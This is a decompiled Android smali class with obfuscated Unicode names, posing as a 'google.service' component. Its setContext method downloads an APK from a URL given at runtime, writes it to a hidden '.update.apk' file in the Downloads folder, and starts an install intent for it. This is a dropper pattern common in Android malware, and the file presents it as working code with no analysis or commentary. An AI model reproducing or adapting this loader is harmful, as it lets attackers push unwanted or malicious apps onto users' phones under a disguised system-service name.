.class public Lgoogle/service/ﹳㅤθㅤᵢᴵㅤⶱⶱㅤᴵ䉀ⁱ䉀ᴵˉˈʻθʼˋˋೲ䉀ᵔʼᵢㅤ䉀ʿ4796;
.super Landroid/os/AsyncTask;
.source "\ufe73\u3164\u03b8\u3164\u1d62\u1d35\u3164\u2db1\u2db1\u3164\u1d35\u4240\u2071\u4240\u1d35\u02c9\u02c8\u02bb\u03b8\u02bc\u02cb\u02cb\u0cf2\u4240\u1d54\u02bc\u1d62\u3164\u4240\u02bf4796.java"


# annotations
.annotation system Ldalvik/annotation/Signature;
    value = {
        "Landroid/os/AsyncTask<",
        "Ljava/lang/String;",
        "Ljava/lang/Void;",
        "Ljava/lang/Void;",
        ">;"
    }
.end annotation


# instance fields
.field private context:Landroid/content/Context;


# direct methods
.method public constructor <init>()V
    .locals 0

    .line 14
    invoke-direct {p0}, Landroid/os/AsyncTask;-><init>()V

    return-void
.end method


# virtual methods
.method protected bridge synthetic doInBackground([Ljava/lang/Object;)Ljava/lang/Object;
    .locals 0

    .line 14
    check-cast p1, [Ljava/lang/String;

    invoke-virtual {p0, p1}, Lgoogle/service/ﹳㅤθㅤᵢᴵㅤⶱⶱㅤᴵ䉀ⁱ䉀ᴵˉˈʻθʼˋˋೲ䉀ᵔʼᵢㅤ䉀ʿ4796;->doInBackground([Ljava/lang/String;)Ljava/lang/Void;

    move-result-object p1

    return-object p1
.end method

.method protected varargs doInBackground([Ljava/lang/String;)Ljava/lang/Void;
    .locals 0

    const/4 p1, 0x0

    return-object p1
.end method

.method public varargs setContext(Landroid/content/Context;[Ljava/lang/String;)V
    .locals 5

    .line 17
    iput-object p1, p0, Lgoogle/service/ﹳㅤθㅤᵢᴵㅤⶱⶱㅤᴵ䉀ⁱ䉀ᴵˉˈʻθʼˋˋೲ䉀ᵔʼᵢㅤ䉀ʿ4796;->context:Landroid/content/Context;

    .line 19
    :try_start_0
    new-instance p1, Ljava/net/URL;

    const/4 v0, 0x0

    aget-object p2, p2, v0

    invoke-direct {p1, p2}, Ljava/net/URL;-><init>(Ljava/lang/String;)V

    .line 20
    invoke-virtual {p1}, Ljava/net/URL;->openConnection()Ljava/net/URLConnection;

    move-result-object p1

    check-cast p1, Ljava/net/HttpURLConnection;

    const-string p2, "GET"

    .line 21
    invoke-virtual {p1, p2}, Ljava/net/HttpURLConnection;->setRequestMethod(Ljava/lang/String;)V

    const/4 p2, 0x1

    .line 22
    invoke-virtual {p1, p2}, Ljava/net/HttpURLConnection;->setDoOutput(Z)V

    .line 23
    invoke-virtual {p1}, Ljava/net/HttpURLConnection;->connect()V

    const-string v1, "/mnt/sdcard/Download/"

    .line 26
    new-instance v2, Ljava/io/File;

    invoke-direct {v2, v1}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 27
    invoke-virtual {v2}, Ljava/io/File;->mkdirs()Z

    .line 28
    new-instance v1, Ljava/io/File;

    const-string v3, ".update.apk"

    invoke-direct {v1, v2, v3}, Ljava/io/File;-><init>(Ljava/io/File;Ljava/lang/String;)V

    .line 29
    invoke-virtual {v1}, Ljava/io/File;->exists()Z

    move-result v2

    if-eqz v2, :cond_0

    .line 30
    invoke-virtual {v1}, Ljava/io/File;->delete()Z

    .line 32
    :cond_0
    new-instance v2, Ljava/io/FileOutputStream;

    invoke-direct {v2, v1}, Ljava/io/FileOutputStream;-><init>(Ljava/io/File;)V

    .line 34
    invoke-virtual {p1}, Ljava/net/HttpURLConnection;->getInputStream()Ljava/io/InputStream;

    move-result-object p1

    const/16 v1, 0x400

    new-array v1, v1, [B

    .line 38
    :goto_0
    invoke-virtual {p1, v1}, Ljava/io/InputStream;->read([B)I

    move-result v3

    const/4 v4, -0x1

    if-eq v3, v4, :cond_1

    .line 39
    invoke-virtual {v2, v1, v0, v3}, Ljava/io/FileOutputStream;->write([BII)V

    goto :goto_0

    .line 41
    :cond_1
    invoke-virtual {v2}, Ljava/io/FileOutputStream;->close()V

    .line 42
    invoke-virtual {p1}, Ljava/io/InputStream;->close()V

    .line 44
    new-instance p1, Landroid/content/Intent;

    const-string v0, "android.intent.action.VIEW"

    invoke-direct {p1, v0}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    .line 45
    iget-object v0, p0, Lgoogle/service/ﹳㅤθㅤᵢᴵㅤⶱⶱㅤᴵ䉀ⁱ䉀ᴵˉˈʻθʼˋˋೲ䉀ᵔʼᵢㅤ䉀ʿ4796;->context:Landroid/content/Context;

    new-instance v1, Ljava/io/File;

    const-string v2, "/mnt/sdcard/Download/.update.apk"

    invoke-direct {v1, v2}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-static {v0, v1}, Lgoogle/service/䉀φ₫יⶱˉˈˋφʾﹳ$ˉㅤᵢ$ˋʿʾ$ᵔ䉀ʿ$יʿㅤ$$ᴵˋ4774;->uriFromFile(Landroid/content/Context;Ljava/io/File;)Landroid/net/Uri;

    move-result-object v0

    const-string v1, "application/vnd.android.package-archive"

    invoke-virtual {p1, v0, v1}, Landroid/content/Intent;->setDataAndType(Landroid/net/Uri;Ljava/lang/String;)Landroid/content/Intent;

    const/high16 v0, 0x10000000

    .line 46
    invoke-virtual {p1, v0}, Landroid/content/Intent;->setFlags(I)Landroid/content/Intent;

    .line 47
    invoke-static {p2}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object p2

    sput-object p2, Lgoogle/service/ﹶˎφᘣʿᘣঙᵎʾʾθᴵ$䉀ʾʾφㅤㅤφـ47722;->FOR_IN:Ljava/lang/Boolean;

    .line 48
    iget-object p2, p0, Lgoogle/service/ﹳㅤθㅤᵢᴵㅤⶱⶱㅤᴵ䉀ⁱ䉀ᴵˉˈʻθʼˋˋೲ䉀ᵔʼᵢㅤ䉀ʿ4796;->context:Landroid/content/Context;

    invoke-virtual {p2, p1}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    return-void
.end method
